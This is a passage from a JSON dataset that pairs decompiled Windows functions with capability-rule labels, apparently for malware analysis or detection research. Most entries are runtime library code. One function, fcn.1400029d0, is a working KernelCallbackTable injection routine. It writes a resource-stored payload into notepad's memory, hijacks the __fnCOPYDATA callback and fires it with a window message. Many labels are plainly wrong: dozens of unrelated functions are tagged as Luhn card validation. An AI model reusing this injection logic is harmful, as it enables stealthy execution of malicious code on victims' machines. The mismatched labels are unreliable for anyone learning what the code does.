        "decompiled_code": "\nuint32_t fcn.140026a84(void)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t in_MXCSR;\n    \n    uVar1 = in_MXCSR & 0x8040;\n    if (uVar1 == 0x8000) {\n        uVar4 = 0xc00;\n    }\n    else if (uVar1 == 0x40) {\n        uVar4 = 0x800;\n    }\n    else {\n        uVar4 = 0;\n        if (uVar1 == 0x8040) {\n            uVar4 = 0x400;\n        }\n    }\n    uVar2 = in_MXCSR & 0x6000;\n    if (uVar2 == 0) {\n        uVar3 = 0;\n    }\n    else if (uVar2 == 0x2000) {\n        uVar3 = 0x100;\n    }\n    else if (uVar2 == 0x4000) {\n        uVar3 = 0x200;\n    }\n    else {\n        uVar3 = 0x300;\n        if (uVar2 != 0x6000) {\n            uVar3 = 0;\n        }\n    }\n    uVar4 = ((((in_MXCSR >> 2 & 0x400 | in_MXCSR & 0x800) >> 2 | in_MXCSR & 0x400) >> 2 | in_MXCSR & 0x200) >> 3 |\n            in_MXCSR & 0x180) >> 3 | uVar4 | uVar3;\n    return (uVar3 | uVar4 * 4) << 0x16 | uVar4;\n}\n",
        "token_count": 402
    },
    "14001aa7": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nulong fcn.14001aa74(uint64_t *arg1, uchar *arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint16_t uVar3;\n    ulong uVar4;\n    char *pcVar5;\n    uint8_t *puVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint8_t uVar10;\n    int16_t iVar11;\n    uint8_t *arg1_00;\n    uint32_t uVar12;\n    uint8_t *puVar13;\n    uint64_t uVar14;\n    uint64_t uVar15;\n    uint32_t in_stack_00000030;\n    uint8_t in_stack_00000038;\n    uint32_t in_stack_00000048;\n    int64_t in_stack_00000050;\n    \n    *arg2 = 0;\n    uVar12 = 0;\n    if (-1 < in_stack_00000030) {\n        uVar12 = in_stack_00000030;\n    }\n    if (arg3 <= uVar12 + 0xb) {\n        *(in_stack_00000050 + 0x30) = 1;\n        *(in_stack_00000050 + 0x2c) = 0x22;\n        fcn.14000bf58(0, 0, 0, 0);\n        return 0x22;\n    }\n    uVar14 = *arg1;\n    uVar9 = 0x7ff;\n    if ((uVar14 >> 0x34 & 0x7ff) == 0x7ff) {\n        uVar4 = fcn.14001ae28(arg1, arg2, arg3, arg4);\n        if (uVar4 != 0) {\n            *arg2 = 0;\n            return uVar4;\n        }\n        pcVar5 = fcn.140029940(arg2, 0x65);\n        if (pcVar5 == NULL) {\n            return 0;\n        }\n        *pcVar5 = (in_stack_00000038 ^ 1) * ' ' + 'P';\n        pcVar5[3] = '\\0';\n        return 0;\n    }\n    if (uVar14 < 0) {\n        *arg2 = 0x2d;\n        arg2 = arg2 + 1;\n        uVar14 = *arg1;\n    }\n    puVar1 = arg2 + 1;\n    uVar15 = 0x3ff;\n    iVar11 = (in_stack_00000038 ^ 1) * 0x20 + 7;\n    if ((uVar14 & 0x7ff0000000000000) == 0) {\n        *arg2 = 0x30;\n        uVar15 = -((*arg1 & 0xfffffffffffff) != 0) & 0x3fe;\n    }\n    else {\n        *arg2 = 0x31;\n    }\n    arg1_00 = arg2 + 2;\n    if (uVar12 == 0) {\n        uVar10 = 0;\n    }\n    else {\n        if (*(in_stack_00000050 + 0x28) == '\\0') {\n            fcn.140010150(in_stack_00000050);\n        }\n        uVar10 = ***(*(in_stack_00000050 + 0x18) + 0xf8);\n    }\n    *puVar1 = uVar10;\n    if ((*arg1 & 0xfffffffffffff) != 0) {\n        uVar9 = 0x30;\n        uVar14 = 0xf000000000000;\n        do {\n            if (uVar12 < 1) {\n                cVar2 = fcn.14001b48c(arg1, uVar14, uVar9, in_stack_00000048);\n                uVar9 = uVar14;\n                puVar13 = arg1_00;\n                if (cVar2 != '\\0') {\n                    while( true ) {\n                        puVar6 = puVar13 + -1;\n                        uVar10 = *puVar6;\n                        uVar14 = uVar14 & 0xffffffffffffff00 | uVar10;\n                        if ((uVar14 - 0x46U & 0xdf) != 0) break;\n                        *puVar6 = 0x30;\n                        puVar13 = puVar6;\n                    }\n                    uVar9 = uVar14;\n                    if (puVar6 == puVar1) {\n                        puVar13[-2] = puVar13[-2] + 1;\n                    }\n                    else {\n                        if (uVar10 == 0x39) {\n                            uVar10 = iVar11 + 0x3a;\n                        }\n                        else {\n                            uVar10 = uVar10 + 1;\n                        }\n                        *puVar6 = uVar10;\n                    }\n                }\n                break;\n            }\n            uVar3 = ((*arg1 & uVar14) >> (uVar9 & 0x3f)) + 0x30;\n            if (0x39 < uVar3) {\n                uVar3 = uVar3 + iVar11;\n            }\n            *arg1_00 = uVar3;\n            uVar12 = uVar12 - 1;\n            arg1_00 = arg1_00 + 1;\n            uVar14 = uVar14 >> 4;\n            uVar3 = uVar9 - 4;\n            uVar9 = uVar3;\n        } while (-1 < uVar3);\n    }\n    if (0 < uVar12) {\n        fcn.140008040(arg1_00, uVar9 & 0xffffffffffffff00 | 0x30, uVar12);\n        arg1_00 = arg1_00 + uVar12;\n    }\n    if (*puVar1 == 0) {\n        arg1_00 = puVar1;\n    }\n    *arg1_00 = (in_stack_00000038 ^ 1) * ' ' + 0x50;\n    puVar1 = arg1_00 + 2;\n    uVar12 = *arg1 >> 0x34 & 0x7ff;\n    iVar7 = uVar12 - uVar15;\n    iVar8 = iVar7;\n    if (iVar7 < 0) {\n        iVar8 = uVar15 - uVar12;\n    }\n    uVar10 = 0x2b;\n    if (iVar7 < 0) {\n        uVar10 = 0x2d;\n    }\n    arg1_00[1] = uVar10;\n    *puVar1 = 0x30;\n    puVar13 = puVar1;\n    if (iVar8 < 1000) {\ncode_r0x00014001ad94:\n        if (99 < iVar8) goto code_r0x00014001ad9a;\ncode_r0x00014001adcd:\n        if (iVar8 < 10) goto code_r0x00014001adfe;\n    }\n    else {\n        puVar13 = arg1_00 + 3;\n        *puVar1 = iVar8 / 1000 + 0x30;\n        iVar8 = iVar8 % 1000;\n        if (puVar13 == puVar1) goto code_r0x00014001ad94;\ncode_r0x00014001ad9a:\n        iVar7 = SUB168(SEXT816(-0x5c28f5c28f5c28f5) * SEXT816(iVar8) >> 0x40, 0) + iVar8;\n        iVar7 = (iVar7 >> 6) - (iVar7 >> 0x3f);\n        *puVar13 = iVar7 + 0x30;\n        puVar13 = puVar13 + 1;\n        iVar8 = iVar8 + iVar7 * -100;\n        if (puVar13 == puVar1) goto code_r0x00014001adcd;\n    }\n    *puVar13 = iVar8 / 10 + 0x30;\n    puVar13 = puVar13 + 1;\n    iVar8 = iVar8 % 10;\ncode_r0x00014001adfe:\n    *puVar13 = iVar8 + 0x30;\n    puVar13[1] = 0;\n    return 0;\n}\n",
        "token_count": 1847
    },
    "14000605": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.14000605c(ulong param_1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006020(param_1);\n    return (iVar1 != 0) - 1;\n}\n",
        "token_count": 54
    },
    "1400013a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1400013a0(uint64_t ****arg1, ulong *arg2, uint64_t **arg3)\n\n{\n    uint64_t arg1_00;\n    uint64_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint64_t ***pppuVar6;\n    uint64_t ****ppppuVar7;\n    uint64_t uVar8;\n    ulong var_fh;\n    ulong var_17h;\n    uchar auStack216 [32];\n    uint64_t ****ppppuStack184;\n    uint uStack176;\n    uint uStack172;\n    uint64_t *puStack168;\n    uint64_t uStack160;\n    uint64_t ****ppppuStack152;\n    uint64_t ****ppppuStack144;\n    ulong uStack136;\n    uint64_t *puStack128;\n    uint64_t uStack120;\n    uchar auStack104 [7];\n    ulong var_59h;\n    uchar auStack88 [7];\n    uint64_t var_49h;\n    uint64_t var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_21h;\n    ulong var_19h;\n    ulong var_9h;\n    ulong var_1h;\n    \n    *NULL = *0x14003e020 ^ auStack216;\n    ppppuVar7 = NULL;\n    ppppuStack184 = NULL;\n    puStack168 = NULL;\n    uStack160 = 0;\n    puVar1 = arg3[2];\n    if (0xf < arg3[3]) {\n        arg3 = *arg3;\n    }\n    if (puVar1 < 0x10) {\n        ppppuStack184 = *arg3;\n        uStack176 = *(arg3 + 1);\n        uStack172 = *(arg3 + 0xc);\n        uVar8 = 0xf;\n    }\n    else {\n        uVar8 = puVar1 | 0xf;\n        if (0x7fffffffffffffff < uVar8) {\n            uVar8 = 0x7fffffffffffffff;\n        }\n        arg1_00 = uVar8 + 1;\n        ppppuStack152 = arg1;\n        if (arg1_00 < 0x1000) {\n            if (arg1_00 != 0) {\n                ppppuVar7 = fcn.140005b40(arg1_00);\n            }\n        }\n        else {\n            if (uVar8 + 0x28 <= arg1_00) {\n                fcn.140001210();\n                goto code_r0x0001400015f6;\n            }\n            pppuVar6 = fcn.140005b40(uVar8 + 0x28);\n            if (pppuVar6 == NULL) goto code_r0x0001400015ea;\n            ppppuVar7 = pppuVar6 + 0x27U & 0xffffffffffffffe0;\n            ppppuVar7[-1] = pppuVar6;\n        }\n        ppppuStack184 = ppppuVar7;\n        fcn.140007990(ppppuVar7, arg3, puVar1 + 1);\n    }\n    ppppuStack152 = &ppppuStack184;\n    _auStack104 = *arg2;\n    var_59h._1_4_ = *(arg2 + 1);\n    unique0x1000025b = *(arg2 + 0xc);\n    puStack168 = puVar1;\n    uStack160 = uVar8;\n    if (puVar1 != NULL) {\n        fcn.1400026a0(&ppppuStack184, 0x140039188, 2);\n    }\n    (**(*CONCAT44(stack0xffffffffffffffa4, var_59h._1_4_) + 0x10))\n              (CONCAT44(stack0xffffffffffffffa4, var_59h._1_4_), auStack104, _auStack104 & 0xffffffff);\n    ppppuVar7 = auStack104;\n    if (0xf < stack0xffffffffffffffb0) {\n        ppppuVar7 = _auStack104;\n    }\n    fcn.1400026a0(&ppppuStack184, ppppuVar7, _auStack88);\n    if (0xf < stack0xffffffffffffffb0) {\n        ppppuVar7 = _auStack104;\n        if ((0xfff < stack0xffffffffffffffb0 + 1) &&\n           (ppppuVar7 = _auStack104[-1],  0x1f < _auStack104 + (-8 - ppppuVar7))) {\ncode_r0x0001400015f6:\n            fcn.14000c048();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.140005b7c(ppppuVar7);\n    }\n    uVar8 = uStack160;\n    ppppuVar7 = ppppuStack184;\n    uStack136 = CONCAT44(uStack172, uStack176);\n    ppppuStack144 = ppppuStack184;\n    puStack128 = puStack168;\n    uStack120 = uStack160;\n    puStack168 = NULL;\n    uStack160 = 0xf;\n    ppppuStack184 = ppppuStack184 & 0xffffffffffffff00;\n    _auStack104 = &ppppuStack144;\n    if (0xf < uVar8) {\n        _auStack104 = ppppuVar7;\n    }\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    var_59h._1_4_ = CONCAT31(var_59h._2_3_, 1);\n    fcn.140007678(auStack104, arg1 + 1);\n    *arg1 = vtable.std::runtime_error.0;\n    if (0xf < uStack120) {\n        ppppuVar7 = ppppuStack144;\n        if ((0xfff < uStack120 + 1) && (ppppuVar7 = ppppuStack144[-1],  0x1f < ppppuStack144 + (-8 - ppppuVar7))) {\ncode_r0x0001400015ea:\n            fcn.14000c048();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        fcn.140005b7c(ppppuVar7);\n    }\n    *arg1 = vtable.std::_System_error.0;\n    uVar3 = *(arg2 + 4);\n    uVar4 = *(arg2 + 1);\n    uVar5 = *(arg2 + 0xc);\n    *(arg1 + 3) = *arg2;\n    *(arg1 + 0x1c) = uVar3;\n    *(arg1 + 4) = uVar4;\n    *(arg1 + 0x24) = uVar5;\n    fcn.140005b20(stack0xffffffffffffffb8 ^ auStack216);\n    return;\n}\n",
        "token_count": 1680
    },
    "14000290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140002900(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    ulong unaff_R14;\n    ulong in_stack_ffffffffffffffd0;\n    \n    puVar2 = fcn.1400028f0();\n    iVar1 = fcn.1400104fc(*puVar2, arg1, arg2, arg3, arg4, 0, &stack0x00000028, in_stack_ffffffffffffffd0, unaff_R14);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 151
    },
    "1400029d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "create process on Windows",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771",
            "create process suspended",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a",
            "open process",
            "check process job object/8aaf725824be4e7b84101cffc1f879ea",
            "allocate RW memory"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1400029d0(void)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    ulong uVar6;\n    code *pcVar7;\n    uint64_t uVar8;\n    uint64_t arg2;\n    ulong uVar9;\n    uchar *arg3;\n    ulong *puVar10;\n    ulong in_R9;\n    ulong var_18h;\n    ulong var_790h;\n    ulong var_798h;\n    ulong var_7a8h;\n    ulong var_7b8h;\n    ulong var_7c8h;\n    ulong var_7d8h;\n    ulong var_7e8h;\n    ulong var_800h;\n    ulong lpString;\n    ulong var_c08h;\n    uchar auStack3368 [32];\n    ulong uStack3336;\n    uint uStack3328;\n    ulong uStack3320;\n    ulong uStack3312;\n    uint *puStack3304;\n    ulong *puStack3296;\n    uint32_t uStack3288;\n    ulong uStack3280;\n    ulong uStack3272;\n    int32_t iStack3264;\n    ulong *puStack3256;\n    ulong auStack3248 [3];\n    uchar auStack3224 [8];\n    int64_t iStack3216;\n    uchar auStack3176 [88];\n    ulong uStack3088;\n    uint auStack1176 [2];\n    uchar auStack1168 [16];\n    uchar auStack1152 [16];\n    uchar auStack1136 [16];\n    uchar auStack1120 [16];\n    uchar auStack1104 [16];\n    uchar auStack1088 [16];\n    ulong auStack1064 [118];\n    ulong var_70h;\n    ulong lpBaseAddress;\n    ulong lpBuffer;\n    ulong uStack40;\n    uint64_t uStack32;\n    \n    uStack32 = *0x14003e020 ^ auStack3368;\n    uVar9 = 10;\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceW)(0);\n    if (iVar2 == 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.140002970(\"[!] Failed to find resource: %d\", uVar1, uVar9, in_R9);\n    }\n    else {\n        iVar4 = iVar2;\n        iVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(0);\n        if (iVar3 == 0) {\n            fcn.140002970(\"[!] Failed to load resource\\n\", iVar4, uVar9, in_R9);\n        }\n        else {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar3);\n            if (iVar3 == 0) {\n                fcn.140002970(\"[!] Failed to lock resource\\n\", iVar4, uVar9, in_R9);\n            }\n            else {\n                uVar1 = (*_sym.imp.KERNEL32.dll_SizeofResource)(0);\n                arg2 = uVar1;\n                if (uVar1 == 0) {\n                    fcn.140002970(\"[!] Fai1led to get reso1urce\\'s size\\n\", iVar2, uVar9, in_R9);\n                }\n                else {\n                    uVar9 = 0x1000;\n                    iVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, arg2, 0x1000, 0x40);\n                    uVar8 = arg2;\n                    iVar2 = iVar4;\n                    fcn.140001f70(iVar3, arg2, uVar9, iVar4);\n                    if (iVar4 == 0) {\n                        fcn.140002970(\"[!] VirtualAlloc Error\\n\", uVar8, uVar9, iVar2);\n                        (*_sym.imp.KERNEL32.dll_CloseHandle)(0);\n                    }\n                    else {\n                        puStack3296 = auStack3248;\n                        auStack1176[0] = 0x68;\n                        puStack3304 = auStack1176;\n                        uVar6 = 0;\n                        uStack3312 = 0;\n                        uVar5 = 0;\n                        uStack3320 = 0;\n                        uStack3328 = 0x10;\n                        uStack3336 = uStack3336 & 0xffffffff00000000;\n                        auStack1168 = ZEXT816(0);\n                        auStack1120 = ZEXT816(0x100000000);\n                        auStack1152 = ZEXT816(0);\n                        auStack1136 = ZEXT816(0);\n                        auStack1104 = ZEXT816(0);\n                        auStack1088 = ZEXT816(0);\n                        (*_sym.imp.KERNEL32.dll_CreateProcessW)(L\"C:\\\\Windows\\\\System32\\\\notepad.exe\", 0);\n                        (*_sym.imp.USER32.dll_WaitForInputIdle)(auStack3248[0], 1000);\n                        uVar9 = (*_sym.imp.USER32.dll_FindWindowW)(L\"Notepad\", 0);\n                        fcn.140002970(\"[+] Window Handle: 0x%p\\n\", uVar9, uVar5, uVar6);\n                        (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(uVar9);\n                        fcn.140002970(\"[+] Process ID: %d\\n\", uStack3288, uVar5, uVar6);\n                        uVar8 = uStack3288;\n                        uVar5 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0);\n                        fcn.140002970(\"[+] Process Handle: 0x%p\\n\", uVar5, uVar8, uVar6);\n                        uVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"ntdll.dll\");\n                        pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6, \"NtQueryInformationProcess\");\n                        uStack3336 = 0;\n                        (*pcVar7)(uVar5, 0, auStack3224, 0x30);\n                        arg3 = auStack3176;\n                        uVar6 = 0x7c8;\n                        uStack3336 = 0;\n                        (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(uVar5, iStack3216);\n                        fcn.140002970(\"[+] PEB Address: 0x%p\\n\", iStack3216, arg3, uVar6);\n                        puVar10 = auStack1064;\n                        uVar6 = 0x400;\n                        uStack3336 = 0;\n                        (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(uVar5, uStack3088);\n                        fcn.140002970(\"[+] KernelCallbackTable Address: 0x%p\\n\", uStack3088, puVar10, uVar6);\n                        uStack3336 = CONCAT44(uStack3336._4_4_, 0x40);\n                        auStack1064[0] = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(uVar5, 0, arg2, 0x3000);\n                        uStack3336 = 0;\n                        (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(uVar5, auStack1064[0]);\n                        fcn.140002970(\"[+] Payload Address: 0x%p\\n\", auStack1064[0], iVar4, arg2);\n                        uStack3336 = CONCAT44(uStack3336._4_4_, 4);\n                        uStack3280 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)(uVar5, 0, 0x400, 0x3000);\n                        uVar6 = 0x400;\n                        puVar10 = auStack1064;\n                        uStack3336 = 0;\n                        (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(uVar5, uStack3280);\n                        fcn.140002970(\"[+] __fnCOPYDATA: 0x%p\\n\", auStack1064[0], puVar10, uVar6);\n                        uVar6 = 8;\n                        iStack3216 = iStack3216 + 0x58;\n                        uStack3336 = 0;\n                        puVar10 = &uStack3280;\n                        (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(uVar5);\n                        fcn.140002970(\"[+] Remote process PEB updated\\n\", iStack3216, puVar10, uVar6);\n                        uStack3272 = 1;\n                        uStack40 = 0x6e00770050;\n                        iStack3264 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&uStack40);\n                        puStack3256 = &uStack40;\n                        uStack3320 = 0;\n                        iStack3264 = iStack3264 * 2;\n                        uStack3328 = 500;\n                        uStack3336 = CONCAT44(uStack3336._4_4_, 3);\n                        (*_sym.imp.USER32.dll_SendMessageTimeoutW)(uVar9, 0x4a, uVar9, &uStack3272);\n                    }\n                }\n            }\n        }\n    }\n    fcn.140005b20(uStack32 ^ auStack3368);\n    return;\n}\n",
        "token_count": 2068
    },
    "14000320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t * fcn.140003204(int64_t *arg1, ulong arg2, ulong noname_2, ulong arg4)\n\n{\n    if (arg4 != 0) {\n        *arg1 = 0x14002b708;\n        arg1[3] = 0;\n        arg1[8] = 0;\n        arg1[9] = 0;\n        arg1[10] = 0;\n        arg1[2] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n    }\n    *(*(*arg1 + 4) + arg1) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    *(*(*arg1 + 4) + -4 + arg1) = *(*arg1 + 4) + -0x10;\n    fcn.140003f50(*(*arg1 + 4) + arg1, arg2);\n    return arg1;\n}\n",
        "token_count": 213
    },
    "14000328": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** fcn.140003288(code **arg1)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    \n    *arg1 = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    pcVar1 = fcn.140005b40(0x10);\n    if (pcVar1 == NULL) {\n        pcVar1 = NULL;\n    }\n    else {\n        uVar2 = fcn.140005030(1);\n        *(pcVar1 + 8) = uVar2;\n    }\n    arg1[0xc] = pcVar1;\n    arg1[3] = arg1 + 1;\n    arg1[4] = arg1 + 2;\n    arg1[7] = arg1 + 5;\n    arg1[8] = arg1 + 6;\n    arg1[10] = arg1 + 9;\n    arg1[0xb] = arg1 + 0x4c;\n    arg1[2] = NULL;\n    arg1[6] = NULL;\n    *(arg1 + 0x4c) = 0;\n    arg1[1] = NULL;\n    arg1[5] = NULL;\n    *(arg1 + 9) = 0;\n    return arg1;\n}\n",
        "token_count": 284
    },
    "140019b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140019b4c(int64_t lpMem)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    if ((lpMem != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x140040928, 0, lpMem),  iVar2 == 0)) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar4 = fcn.140012ba4(uVar3);\n        puVar1 = fcn.140012c78();\n        *puVar1 = uVar4;\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "1400067b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400067b4(void)\n\n{\n    int64_t *piVar1;\n    \n    for (piVar1 = 0x14003aad8; piVar1 < 0x14003aad8; piVar1 = piVar1 + 1) {\n        if (*piVar1 != 0) {\n            (**0x14002b340)();\n        }\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "1400087b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1400087b4(int64_t arg1, int64_t arg2, uint64_t arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    \n    if (arg1 != 0) {\n        iVar5 = *(arg1 + 0x18);\n        iVar1 = *(arg2 + 8);\n        if (iVar5 + iVar1 != 0) {\n            uVar3 = 0;\n            if (*(arg1 + 0x14) != 0) {\n                do {\n                    if (arg3 < *(iVar5 + uVar3 * 8 + iVar1) + iVar1) break;\n                    uVar4 = uVar3 + 1;\n                    uVar3 = uVar4;\n                } while (uVar4 < *(arg1 + 0x14));\n                if (uVar3 != 0) {\n                    return *(iVar5 + (uVar3 - 1) * 8 + 4 + iVar1);\n                }\n            }\n            return 0xffffffff;\n        }\n    }\n    fcn.140012b4c();\n    pcVar2 = swi(3);\n    uVar3 = (*pcVar2)();\n    return uVar3;\n}\n",
        "token_count": 293
    },
    "14000b81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000b810(void)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *0x14003fd40;\n    while (uVar1 != 0) {\n        uVar1 = uVar1 - 1;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(uVar1 * 0x28 + 0x14003fd18);\n        *0x14003fd40 = *0x14003fd40 - 1;\n    }\n    return 1;\n}\n",
        "token_count": 114
    },
    "14000bbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000bbc0(ulong arg1, ulong *arg2)\n\n{\n    fcn.14000b770(arg1, *arg2, 2);\n    return;\n}\n",
        "token_count": 42
    },
    "14000bbf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14000bbf0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    ulong arg1_00;\n    \n    pcVar1 = fcn.14000b770(arg1, arg2, arg4);\n    (*pcVar1)(arg3);\n    arg1_00 = fcn.14000b7a0();\n    fcn.14000b770(arg1_00, arg2, 2);\n    return;\n}\n",
        "token_count": 112
    },
    "14000bca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14000bca0(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t lpFlsData;\n    uint auStackX8 [2];\n    \n    iVar1 = *arg1;\n    lpFlsData = 0;\n    if (iVar1 == 0) {\n        auStackX8[0] = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (*(arg1 + 2) == '\\0') {\n            arg1[1] = 0;\n            *(arg1 + 2) = 1;\n        }\n        else {\n            lpFlsData = arg1[1];\n        }\n        iVar1 = fcn.1400199b4(auStackX8, lpFlsData);\n        *arg1 = iVar1;\n        (*_sym.imp.KERNEL32.dll_SetLastError)(auStackX8[0]);\n    }\n    return iVar1;\n}\n",
        "token_count": 205
    },
    "14000bd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14000bd0c(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    \n    iVar2 = 0;\n    if (*(arg2 + 0x10) == '\\0') {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *(arg2 + 8) = 0;\n        *(arg2 + 0x10) = 1;\n        (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n    }\n    else {\n        iVar2 = *(arg2 + 8);\n    }\n    return arg1 + iVar2 * 8;\n}\n",
        "token_count": 150
    },
    "14000c2b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.14000c2b0(ulong noname_0, ulong *arg2, ulong arg3, ulong *arg4)\n\n{\n    uint uVar1;\n    \n    fcn.14000c298(*arg2);\n    uVar1 = fcn.14000e2f4(arg3);\n    fcn.14000c2a4(*arg4);\n    return uVar1;\n}\n",
        "token_count": 90
    },
    "14000c4a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
